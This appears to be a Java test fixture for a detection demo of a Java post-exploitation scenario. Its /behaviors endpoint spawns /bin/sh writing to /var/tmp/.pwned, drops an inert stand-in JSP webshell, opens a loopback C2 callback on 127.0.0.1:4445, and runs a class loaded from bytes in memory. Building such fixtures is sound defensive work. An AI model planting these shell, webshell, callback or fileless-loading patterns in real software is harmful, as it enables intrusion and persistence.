// SBOB-EXAMPLES DEMO WATERMARK — scenario C (M8, issue #14): Java 17 service
// fixture for the Java2Shell (CVE-2026-114938) detection replay. DEMO ONLY:
// the post-exploit behaviors run FOR REAL inside the disposable container but
// every network stand-in is loopback-local (TDS §4); the real C2 is never
// contacted; the dropped JSP is inert watermark content and is never served.
//
// Endpoints (the HTTP client stand-in is curl, run as root):
//   /benign    declared behavior only (app read, data write, resolver read,
//              declared config-service peer connect)
//   /behaviors the four post-RCE behaviors:
//     b1 /bin/sh spawn (ProcessBuilder -> execve /bin/sh from the JVM)
//     b2 JSP webshell drop under the webapp root /var/www/webapp (undeclared
//        write — opens[] declares only /var/lib/app-data/*)
//     b3 C2 callback to the loopback stand-in 127.0.0.1:4445 (undeclared
//        egress — egress[] declares only 10.96.100.30:8443)
//     b4 defineClass: the payload class bytes are read from /app (a DECLARED
//        read) and defined in-JVM via a custom ClassLoader — no exec, no
//        undeclared open, no socket: the expected-silent leg (the scenario-C
//        analog of scenario B's delta 7), recorded as a committed finding.
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpExchange;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.charset.StandardCharsets;

public class App {
    public static void main(String[] args) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 8080), 0);
        server.createContext("/benign", App::benign);
        server.createContext("/behaviors", App::behaviors);
        server.start();
        System.out.println("java-service fixture up on 127.0.0.1:8080");
    }

    private static void reply(HttpExchange ex, String body) throws IOException {
        byte[] b = body.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "text/plain");
        ex.sendResponseHeaders(200, b.length);
        try (OutputStream os = ex.getResponseBody()) { os.write(b); }
    }

    private static void benign(HttpExchange ex) throws IOException {
        StringBuilder out = new StringBuilder("benign: begin\n");
        // 1. app-file read (declared: opens[] /app/* read)
        byte[] index = Files.readAllBytes(Path.of("/app/index.html"));
        out.append("benign: read ").append(index.length).append(" bytes of /app/index.html\n");
        // 2. data write (declared: opens[] /var/lib/app-data/* write)
        Path counter = Path.of("/var/lib/app-data/counter.txt");
        int n = 0;
        if (Files.exists(counter)) {
            n = Integer.parseInt(Files.readString(counter).trim());
        }
        Files.writeString(counter, String.valueOf(n + 1));
        out.append("benign: counter hits ").append(n + 1).append("\n");
        // 3. resolver read (declared: opens[] /etc/resolv.conf read)
        String resolv = Files.readString(Path.of("/etc/resolv.conf"));
        out.append("benign: resolver line: ").append(resolv.lines().findFirst().orElse("")).append("\n");
        // 4. declared config-service peer connect (egress[] 10.96.100.30:8443,
        //    loopback-local alias; numeric literal so no DNS machinery)
        try (Socket s = new Socket()) {
            s.connect(new InetSocketAddress("10.96.100.30", 8443), 3000);
            s.getOutputStream().write("ping\r\n".getBytes(StandardCharsets.UTF_8));
            out.append("benign: config peer 10.96.100.30:8443 connected\n");
        } catch (Exception e) {
            out.append("benign: config peer connect failed: ").append(e.getMessage()).append("\n");
        }
        out.append("benign: end\n");
        reply(ex, out.toString());
    }

    private static void behaviors(HttpExchange ex) throws IOException {
        StringBuilder out = new StringBuilder("behaviors: begin\n");
        // b1: shell spawn from the JVM — execs[] declares only the JVM itself
        try {
            Process p = new ProcessBuilder("/bin/sh", "-c", "id > /var/tmp/.pwned").start();
            try { p.waitFor(); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
            out.append("behaviors: b1 /bin/sh spawn done (rc=").append(p.exitValue()).append(")\n");
        } catch (Exception e) {
            out.append("behaviors: b1 /bin/sh spawn failed: ").append(e.getMessage()).append("\n");
        }
        // b2: JSP webshell drop under the webapp root (undeclared write)
        try {
            Path shell = Path.of("/var/www/webapp/shell.jsp");
            Files.createDirectories(shell.getParent());
            Files.write(shell, ("<%-- SBOB-EXAMPLES DEMO WATERMARK — inert webshell stand-in, scenario C. " +
                    "Never served: /var/www/webapp is not routed. Demo only (TDS §4). --%>\n")
                    .getBytes(StandardCharsets.UTF_8));
            out.append("behaviors: b2 webshell dropped to /var/www/webapp/shell.jsp\n");
        } catch (Exception e) {
            out.append("behaviors: b2 webshell write failed: ").append(e.getMessage()).append("\n");
        }
        // b3: C2 callback — loopback stand-in 127.0.0.1:4445 (never the real C2)
        try (Socket s = new Socket()) {
            s.connect(new InetSocketAddress("127.0.0.1", 4445), 3000);
            s.getOutputStream().write("GET / HTTP/1.0\r\nHost: c2-standin\r\n\r\n".getBytes(StandardCharsets.UTF_8));
            out.append("behaviors: b3 C2 stand-in 127.0.0.1:4445 connected\n");
        } catch (Exception e) {
            out.append("behaviors: b3 C2 connect failed: ").append(e.getMessage()).append("\n");
        }
        // b4: fileless in-JVM staging — defineClass from bytes read via the
        // DECLARED /app read. No exec/open/connect beyond that: expected silent.
        try {
            byte[] code = Files.readAllBytes(Path.of("/app/Payload.class"));
            Class<?> c = new BytesLoader(App.class.getClassLoader()).def("Payload", code);
            Object o = c.getDeclaredConstructor().newInstance();
            c.getMethod("run").invoke(o);
            out.append("behaviors: b4 defineClass in-JVM payload ran (no OS syscall beyond the declared /app read)\n");
        } catch (Throwable t) {
            out.append("behaviors: b4 defineClass error: ").append(t.getMessage()).append("\n");
        }
        out.append("behaviors: end\n");
        reply(ex, out.toString());
    }

    /** defineClass is protected in ClassLoader — called from a subclass, no reflection. */
    static final class BytesLoader extends ClassLoader {
        BytesLoader(ClassLoader parent) { super(parent); }
        Class<?> def(String name, byte[] b) { return defineClass(name, b, 0, b.length); }
    }
}
